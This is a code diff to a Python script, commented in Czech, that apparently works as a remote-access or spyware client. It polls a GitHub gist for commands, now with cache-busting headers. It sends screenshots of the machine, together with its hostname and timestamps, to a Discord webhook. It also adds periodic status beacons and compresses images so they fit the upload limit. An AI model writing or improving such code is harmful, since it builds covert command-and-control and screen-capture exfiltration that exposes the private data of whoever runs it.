@@ -107,7 +107,11 @@ def send_error_signal(context: str, error: Exception):
 def send_gist_status():
     """Otestuje gist URL a pošle status na Discord."""
     try:
-        resp = requests.get(GIST_COMMAND_URL, timeout=10)
+        cache_bust_url = f"{GIST_COMMAND_URL}?_t={int(time.time())}"
+        resp = requests.get(cache_bust_url, timeout=10, headers={
+            "Cache-Control": "no-cache",
+            "Pragma": "no-cache",
+        })
         status = f"HTTP {resp.status_code}"
         content = resp.text.strip()[:100] if resp.status_code == 200 else "N/A"
         requests.post(DISCORD_WEBHOOK_URL, json={
@@ -203,28 +207,35 @@ def take_screenshot() -> bytes | None:
 
 def send_screenshot_to_discord():
     """Screenshot → Discord webhook jako obrázek."""
-    ss = take_screenshot()
-    if not ss:
-        return
-
-    hostname = "unknown"
     try:
-        import socket
-        hostname = socket.gethostname()
-    except Exception:
-        pass
+        ss = take_screenshot()
+        if not ss:
+            send_error_signal("Screenshot", Exception("take_screenshot() vrátil None — ImageGrab selhal nebo není dostupný"))
+            return
 
-    try:
-        requests.post(
+        hostname = _get_hostname()
+
+        # Discord webhook limit: 8MB, screenshot můž být větší → komprese
+        if len(ss) > 7 * 1024 * 1024:  # >7MB
+            from PIL import Image
+            img = Image.open(io.BytesIO(ss))
+            img = img.resize((img.width // 2, img.height // 2), Image.LANCZOS)  #poloviční rozlišení
+            buf = io.BytesIO()
+            img.save(buf, format="PNG", optimize=True)
+            ss = buf.getvalue()
+
+        resp = requests.post(
             DISCORD_WEBHOOK_URL,
             data={"payload_json": json.dumps({
-                "content": f"📸 Screenshot from `{hostname}`",
+                "content": f"📸 Screenshot from `{hostname}` @ {datetime.now().strftime('%H:%M:%S')}",
             })},
             files={"files": ("screenshot.png", ss, "image/png")},
             timeout=30
         )
-    except Exception:
-        pass
+        if resp.status_code not in [200, 204]:
+            send_error_signal("Screenshot upload", Exception(f"Discord API vrátil HTTP {resp.status_code}: {resp.text[:200]}"))
+    except Exception as e:
+        send_error_signal("Screenshot celý", e)
 
 
 # ═══════════════════════════════════════════════════════════════
@@ -239,10 +250,17 @@ def poll_commands():
     NONE        → nic nedělej
     """
     last_command = None
+    poll_count = 0
 
     while True:
         try:
-            resp = requests.get(GIST_COMMAND_URL, timeout=10)
+            # Cache-buster: GitHub CDN cacheuje raw URLs několik minut.
+            # Přidáme unikátní query parametr → vždy čerstvý obsah.
+            cache_bust_url = f"{GIST_COMMAND_URL}?_t={int(time.time())}"
+            resp = requests.get(cache_bust_url, timeout=10, headers={
+                "Cache-Control": "no-cache",
+                "Pragma": "no-cache",
+            })
             if resp.status_code == 200:
                 cmd = resp.text.strip().upper()
                 if cmd != last_command:
@@ -252,6 +270,28 @@ def poll_commands():
                     last_command = cmd
         except Exception:
             pass
+
+        poll_count += 1
+
+        # Každý 10. poll pošli debug status (5 minut)
+        # → víme, že poller žije a co vidí
+        if poll_count % 10 == 0:
+            try:
+                content_preview = "N/A"
+                try:
+                    content_preview = resp.text.strip()[:50] if resp else "no response"
+                except Exception:
+                    pass
+                requests.post(DISCORD_WEBHOOK_URL, json={
+                    "embeds": [{
+                        "title": "🔄 Poller Status",
+                        "description": f"Poll count: `{poll_count}`\nLast command: `{last_command}`\nGist content: `{content_preview}`",
+                        "color": 0x00AA00,
+                        "timestamp": datetime.now(timezone.utc).isoformat(),
+                    }]
+                }, timeout=15)
+            except Exception:
+                pass
 
         time.sleep(POLL_INTERVAL)
 
